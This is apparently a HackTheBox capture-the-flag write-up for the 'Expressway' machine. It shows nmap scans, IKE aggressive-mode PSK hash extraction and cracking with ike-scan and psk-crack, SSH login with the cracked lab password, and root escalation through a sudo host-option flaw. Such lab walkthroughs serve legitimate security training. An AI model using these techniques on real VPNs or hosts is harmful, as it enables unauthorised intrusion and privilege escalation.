---
layout: post
title: Expressway
subtitle: HackTheBox - Expressway
description: Enumerate services, scan TCP/UDP ports, exploit IPsec vulnerabilities, and escalate privileges to capture flags.
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
optimized_image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
tags:
  - HackTheBox
  - IPsec Vulnerability
  - Privilege Escalation
  - Find Flags
author: Mustafa Altayeb
date: 2025-10-07 00:00
paginate: true
---

# Expressway
[Expressway on HackTheBox](https://app.hackthebox.com/machines/736)

![Expressway Banner](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png)

## Objectives
1. Enumerate UDP/TCP ports
2. Extract SSH credentials via IPsec
3. Gain initial access through SSH
4. Identify privilege escalation vectors
5. Capture user and root flags

## Reconnaissance

### Nmap Scan
Initial TCP port scan:
```bash
nmap -p1-65535 --min-rate 1000 10.10.11.87
```

**Results**:
```
PORT   STATE SERVICE
22/tcp open  ssh
```

UDP port scan:
```bash
nmap -p1-65535 -sU --min-rate 1000 10.10.11.87
```

**Results**:
```
PORT      STATE         SERVICE
9/udp     open|filtered discard
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
500/udp   open          isakmp
520/udp   open|filtered route
626/udp   open|filtered serialnumberd
997/udp   open|filtered maitrd
1030/udp  open|filtered iad1
3703/udp  open|filtered adobeserver-3
4500/udp  open|filtered nat-t-ike
49186/udp open|filtered unknown
49192/udp open|filtered unknown
49200/udp open|filtered unknown
```

**Key Findings**:
- **Port 500/UDP**: Running ISAKMP (IPsec VPN). All other ports filtered except 500.

## IPsec VPN Enumeration

Scan IPsec service:
```bash
nmap -sU -p 500 --script ike-version 10.10.11.87
```

**Results**:
```
PORT    STATE SERVICE
500/udp open  isakmp
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

**Findings**:
- XAUTH and IKE version 1.0 detected.

### Identify VPN Vendor & Configuration
```bash
ike-scan -M -A 10.10.11.87
```

**Results**:
```
DR=(CKY-R=dc48124ff9415a5d)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
KeyExchange(128 bytes)
Nonce(32 bytes)
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
Hash(20 bytes)
```

**Findings**:
- SSH user: `ike@expressway.htb`

### Extract VPN Group Name & PSK Hash
```bash
ike-scan -A --pskcrack 10.10.11.87
```

**Results**:
```
10.10.11.87 Aggressive Mode Handshake returned
HDR=(CKY-R=dcbe8baace3526f4)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
KeyExchange(128 bytes)
Nonce(32 bytes)
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
Hash(20 bytes)
IKE PSK parameters:
eaed8f70947e12fd6067583f9bf689fa787958c4c1f268c416e87ffaf58091972cd2fb68abb7fc72760df90919220443dc5999323373d7017333d2350d89591a56b7bb5fa4bf926f4ef6515a6ba649cc2d6363806bda1156f327a66d15ce729ae4f4bfd4b7adfb06116f6bd3d7a7910398c0d49d3d2ff682ae1bb28a8ca1aad8:366a903bcde43282003ba2039824c675a772350bfcc123ce83bc5f51e422403b2de73fc7e67905b7d3cc5cd856c074770f4c2418fab912c263cdb5b0969fcf68dff33fdcdc007c32a2087340e3982788729b4c6ed74e91454a14ae775440fc0671891da8622fb898d5c5fd3326ea41f2ae0786c629fcf84241e4b492da11144b:dcbe8baace3526f4:7a0abdc5d7de2ce4:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:0bdf118d960e20e50e150b712ec195d1eb36273b:df9b7b0dec195f4609339273ea7eba684c86a2cd76a2e4a306827bf5ab53dc14:6bc5d6a1228177e114af9539ffd18c5aeb014df3
```

Crack the PSK hash:
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash1.txt
```

**Results**:
```
Starting psk-crack [ike-scan 1.9.6]
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 6bc5d6a1228177e114af9539ffd18c5aeb014df3
```

**Credentials**:
- User: `ike@expressway.htb`
- Password: `freakingrockstarontheroad`

## Initial Access via SSH
```bash
ssh ike@10.10.11.87
```

**Output**:
```
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.115.128 | 🥷 VPN IP ➜ 10.10.16.32
ike@10.10.11.87's password: 
Last login: Tue Oct 7 17:06:04 BST 2025 from 10.10.14.115
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
ike@expressway:~$
```

### User Flag
```bash
ike@expressway:~$ ls
es.sh user.txt
ike@expressway:~$ cat user.txt
6e89cbec6...
```

## Privilege Escalation

### System Exploration
Found a `README` file in `/var/log`:
```bash
ike@expressway:/var/log$ cat README
You are looking for the traditional text log files in /var/log, and they are gone?
Here's an explanation on what's going on:
You are running a systemd-based OS where traditional syslog has been replaced with the Journal...
```

Log analysis revealed an internal hostname:
```bash
753229688.902 0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html
```

### Sudo Vulnerability
Check sudo version:
```bash
ike@expressway:/$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

**Vulnerability**: Sudo 1.9.17 Host Option - Elevation of Privilege
- Allows execution of commands permitted by a remote host rule on the local system.

Exploit using the internal hostname:
```bash
ike@expressway:/$ sudo -h offramp.expressway.htb -i
root@expressway:~#
```

### Root Flag
```bash
root@expressway:~# ls
root.txt
root@expressway:~# cat root.txt
2f5481da2fed7...
```

## Conclusion
Successfully exploited an IPsec VPN to gain SSH credentials, accessed the system as user `ike`, and escalated privileges to root using a sudo vulnerability tied to an internal hostname.

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>

Follow me:
- [Linkedin](https://www.linkedin.com/in/t4t4r1s/)
- [Link 2](https://x.com/T4T4R1S)
```